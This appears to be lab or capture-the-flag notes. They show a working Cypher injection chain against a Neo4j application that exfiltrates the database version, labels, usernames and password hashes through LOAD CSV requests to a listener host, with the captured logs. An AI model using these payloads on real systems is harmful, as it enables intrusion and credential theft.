```' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name LOAD CSV FROM 'http://10.10.16.5:8069/?name='   name as l RETURN 0 as _0 // ```

```10.10.11.210 - - [26/Apr/2023 13:57:50] "GET /?name=Neo4j Kernel HTTP/1.1" 400 -```

```' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.16.5:8069/?version='   version   '&name='   name   '&edition='   edition as l RETURN 0 as _0 // ```

```10.10.11.210 - - [26/Apr/2023 14:20:31] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -```

```' OR 1=1 WITH 1 as a  CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.16.5:8069/?label='   label as l RETURN 0 as _0 // ```

```
10.10.11.210 - - [26/Apr/2023 14:25:43] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [26/Apr/2023 14:25:43] "GET /?label=employee HTTP/1.1" 200 -
```

```' OR 1=1 WITH 1 as a  MATCH (u:user) UNWIND keys(u) as p LOAD CSV FROM 'http://10.10.16.5:8069/?keys='   toString(u[p]) as l RETURN 0 as _0 // ```
```
10.10.11.210 - - [26/Apr/2023 14:27:05] "GET /?keys=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [26/Apr/2023 14:27:06] "GET /?keys=admin HTTP/1.1" 200 -
10.10.11.210 - - [26/Apr/2023 14:27:06] "GET /?keys=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [26/Apr/2023 14:27:07] "GET /?keys=john HTTP/1.1" 200 -
```
